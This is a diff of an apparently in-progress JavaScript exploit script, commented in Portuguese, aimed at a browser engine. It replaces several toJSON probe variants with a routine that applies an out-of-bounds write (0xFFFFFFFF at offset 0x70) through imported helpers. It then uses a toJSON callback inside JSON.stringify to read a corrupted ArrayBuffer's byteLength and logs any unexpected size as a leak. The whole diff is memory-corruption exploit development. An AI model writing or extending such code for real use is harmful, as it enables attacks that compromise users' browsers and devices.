@@ -5,122 +5,117 @@ import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError
 import { OOB_CONFIG } from '../config.mjs'; 
 import { toHex } from '../utils.mjs';     
 
-// --- Funções toJSON para teste de decomposição ULTRA MINIMALISTA ---
+// Variante Y.1: Tenta ler this.byteLength
+function toJSON_AttemptLeakByteLength() {
+    // Não usar current_toJSON_call_count_for_TypeError_test++ aqui para evitar o TypeError conhecido.
+    // Não usar logS3 aqui pelo mesmo motivo.
+    // Não mudar document.title aqui pelo mesmo motivo.
+    
+    let len = "N/A_toJSON_AttemptLeakByteLength";
+    let this_type = "N/A";
+    let error_msg = null;
 
-// Variante 0: Absolutamente Mínima (apenas return {})
-function toJSON_Decomp_V0_ReturnEmptyObject() {
-    // Não incrementa current_toJSON_call_count_for_TypeError_test aqui para ver se a chamada em si é o problema.
-    // O contador externo em executeFocusedTestForTypeError ainda será 0 se esta função não for chamada ou falhar antes do incremento.
-    // document.title = `toJSON_Decomp_V0 Executing`; // Canary mínimo
-    return {}; 
-}
-
-// Variante 1: Apenas uma operação matemática local e retorna.
-function toJSON_Decomp_V1_LocalMathOnly() {
-    current_toJSON_call_count_for_TypeError_test++; // Contar entrada
-    // document.title = `toJSON_Decomp_V1 Call ${current_toJSON_call_count_for_TypeError_test}`;
-    let x = 1 + 1; // Operação puramente local
-    return { step: 1, res: x, call: current_toJSON_call_count_for_TypeError_test };
-}
-
-// Variante 2: Apenas incrementa o contador global e retorna.
-function toJSON_Decomp_V2_GlobalCounterOnly() {
-    current_toJSON_call_count_for_TypeError_test++;
-    // document.title = `toJSON_Decomp_V2 Call ${current_toJSON_call_count_for_TypeError_test}`;
-    return { step: 2, call: current_toJSON_call_count_for_TypeError_test };
-}
-
-// Variante 3: Apenas muda document.title e retorna.
-function toJSON_Decomp_V3_TitleOnly() {
-    current_toJSON_call_count_for_TypeError_test++; 
-    document.title = `toJSON_Decomp_V3 Call ${current_toJSON_call_count_for_TypeError_test}`;
-    return { step: 3, call: current_toJSON_call_count_for_TypeError_test };
-}
-
-// Variante 4 (Referência do problema anterior): Tentativa de logS3
-function toJSON_Decomp_V4_AttemptLogS3() {
-    current_toJSON_call_count_for_TypeError_test++;
-    const FNAME_toJSON = "toJSON_Decomp_V4_AttemptLogS3_Internal";
-    document.title = `toJSON_Decomp_V4 Call ${current_toJSON_call_count_for_TypeError_test}`;
     try {
-        logS3(`[${FNAME_toJSON}] Chamada ${current_toJSON_call_count_for_TypeError_test}! this: ${typeof this}`, "critical", FNAME_toJSON);
+        this_type = Object.prototype.toString.call(this);
+        if (this instanceof ArrayBuffer) {
+            len = this.byteLength;
+        } else {
+            len = "this_is_not_ArrayBuffer";
+        }
     } catch (e) {
-        console.error("ERRO DENTRO de toJSON_Decomp_V4_AttemptLogS3 ao chamar logS3:", e);
-        document.title = "ERRO INTERNO toJSON_Decomp_V4";
-        throw e; 
+        // Se o acesso a this.byteLength ou instanceof ArrayBuffer causar erro
+        len = `EXCEPTION_ACCESSING_THIS: ${e.name} - ${e.message}`;
+        error_msg = e.message;
+        // Mudar o título aqui PODE ser um canary útil se o return falhar, mas também pode causar TypeError
+        // document.title = `toJSON_LeakByteLength EXCEPTION`; 
     }
-    return { step: 4, logged: true, call: current_toJSON_call_count_for_TypeError_test };
+    
+    // Retornar um objeto simples para JSON.stringify processar.
+    // Se o próprio return causar o TypeError, saberemos.
+    // Se JSON.stringify não conseguir serializar este objeto simples, também saberemos.
+    return { 
+        toJSON_executed: "toJSON_AttemptLeakByteLength",
+        observed_this_type: this_type,
+        observed_len: len,
+        error_in_toJSON: error_msg
+    };
 }
 
 
-async function runDecompositionMaximalTest() {
-    const FNAME_RUNNER = "runDecompositionMaximalTest";
-    logS3(`==== INICIANDO Decomposição Máxima do Gatilho do TypeError ====`, 'test', FNAME_RUNNER);
-
-    const tests = [
-        { description: "Decomp_V0_ReturnEmptyObject", func: toJSON_Decomp_V0_ReturnEmptyObject },
-        { description: "Decomp_V1_LocalMathOnly", func: toJSON_Decomp_V1_LocalMathOnly },
-        { description: "Decomp_V2_GlobalCounterOnly", func: toJSON_Decomp_V2_GlobalCounterOnly },
-        { description: "Decomp_V3_TitleOnly", func: toJSON_Decomp_V3_TitleOnly },
-        { description: "Decomp_V4_AttemptLogS3", func: toJSON_Decomp_V4_AttemptLogS3 },
-    ];
+async function runByteLengthLeakAttempt() {
+    const FNAME_RUNNER = "runByteLengthLeakAttempt";
+    logS3(`==== INICIANDO Tentativa de Leak de ByteLength via toJSON ====`, 'test', FNAME_RUNNER);
 
     const valueForCorruption = 0xFFFFFFFF;
     const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
+    const testDescription = `LeakByteLength_OOB_${toHex(valueForCorruption)}_at_${toHex(criticalOffset)}`;
+    
+    logS3(`\n--- Executando Teste: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
+    
+    let result = await executeFocusedTestForTypeError(
+        testDescription,
+        toJSON_AttemptLeakByteLength,
+        valueForCorruption,
+        criticalOffset
+    );
+    
+    if (result.errorOccurred) {
+        logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
+        if (result.errorOccurred.stack) logS3(`      Stack: ${result.errorOccurred.stack}`, "error");
+    } else if (result.potentiallyCrashed) {
+        logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL.`, "error", FNAME_RUNNER);
+    } else {
+        logS3(`   RESULTADO ${testDescription}: Completou sem erro explícito.`, "good", FNAME_RUNNER);
+        logS3(`      Stringify Result: ${result.stringifyResult}`, "leak", FNAME_RUNNER); // Log completo do resultado
 
-    for (const test of tests) {
-        logS3(`\n--- Testando Variante toJSON: ${test.description} ---`, 'subtest', FNAME_RUNNER);
-        document.title = `Iniciando SubTeste: ${test.description}`; 
-        
-        const result = await executeFocusedTestForTypeError(
-            test.description,
-            test.func,
-            valueForCorruption,
-            criticalOffset
-        );
-        
-        if (result.errorOccurred) {
-            logS3(`   RESULTADO ${test.description}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
-        } else if (result.potentiallyCrashed) {
-            logS3(`   RESULTADO ${test.description}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
-        } else {
-            logS3(`   RESULTADO ${test.description}: Completou sem erro explícito. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
+        // Análise do resultado do stringifyResult (que é o objeto retornado pela toJSON)
+        if (result.stringifyResult && typeof result.stringifyResult === 'object') {
+            if (result.stringifyResult.toJSON_executed === "toJSON_AttemptLeakByteLength") {
+                logS3(`      toJSON_AttemptLeakByteLength foi executada.`, "info", FNAME_RUNNER);
+                logS3(`      Tipo de 'this' observado na toJSON: ${result.stringifyResult.observed_this_type}`, "info", FNAME_RUNNER);
+                logS3(`      ByteLength observado na toJSON: ${result.stringifyResult.observed_len}`, "leak", FNAME_RUNNER);
+                if (result.stringifyResult.error_in_toJSON) {
+                    logS3(`      Erro DENTRO da toJSON: ${result.stringifyResult.error_in_toJSON}`, "warn", FNAME_RUNNER);
+                }
+                if (result.stringifyResult.observed_this_type === "[object ArrayBuffer]" && 
+                    typeof result.stringifyResult.observed_len === 'number' &&
+                    result.stringifyResult.observed_len !== 64) {
+                    logS3(`      !!!! POTENCIAL LEAK/CORRUPÇÃO DE TAMANHO DETECTADA !!!! Tamanho observado: ${result.stringifyResult.observed_len}`, "critical", FNAME_RUNNER);
+                    document.title = `POTENCIAL LEAK/CORRUPÇÃO TAMANHO: ${result.stringifyResult.observed_len}`;
+                }
+            }
         }
-        logS3(`   Título da página ao final de ${test.description}: ${document.title}`, "info");
-        await PAUSE_S3(MEDIUM_PAUSE_S3);
-
-        if (document.title.startsWith("CONGELOU?")) {
-            logS3("Congelamento detectado, interrompendo próximos testes de decomposição.", "error", FNAME_RUNNER);
-            break;
-        }
-        // Se um TypeError ocorrer, ele será capturado e o loop continuará para o próximo teste.
     }
+    logS3(`   Título da página ao final de ${testDescription}: ${document.title}`, "info");
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    logS3(`==== Decomposição Máxima do Gatilho do TypeError CONCLUÍDA ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Tentativa de Leak de ByteLength via toJSON CONCLUÍDA ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_DecomposeMaximalTypeError';
+    const FNAME = 'runAllAdvancedTestsS3_AttemptByteLengthLeak';
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
     if (runBtn) runBtn.disabled = true;
     if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3(`==== INICIANDO Script 3: Decomposição Máxima do Gatilho do TypeError ====`,'test', FNAME);
-    document.title = "Iniciando Script 3 - Decomp Máxima TypeError";
+    logS3(`==== INICIANDO Script 3: Tentativa de Leak de ByteLength via toJSON Pós-Corrupção ====`,'test', FNAME);
+    document.title = "Iniciando Script 3 - Leak ByteLength";
     
-    await runDecompositionMaximalTest();
+    await runByteLengthLeakAttempt();
     
-    logS3(`\n==== Script 3 CONCLUÍDO (Decomposição Máxima do Gatilho do TypeError) ====`,'test', FNAME);
+    logS3(`\n==== Script 3 CONCLUÍDO (Tentativa de Leak de ByteLength) ====`,'test', FNAME);
     if (runBtn) runBtn.disabled = false;
     
     if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
         // Manter
-    } else if (document.title.includes("ERRO")) {
+    } else if (document.title.includes("ERRO") || document.title.includes("EXCEPTION")) {
         // Manter título de erro
+    } else if (document.title.includes("POTENCIAL LEAK")) {
+        // Manter título de leak
     }
     else {
-        document.title = "Script 3 Concluído - Decomp Máxima TypeError";
+        document.title = "Script 3 Concluído - Leak ByteLength";
     }
 }
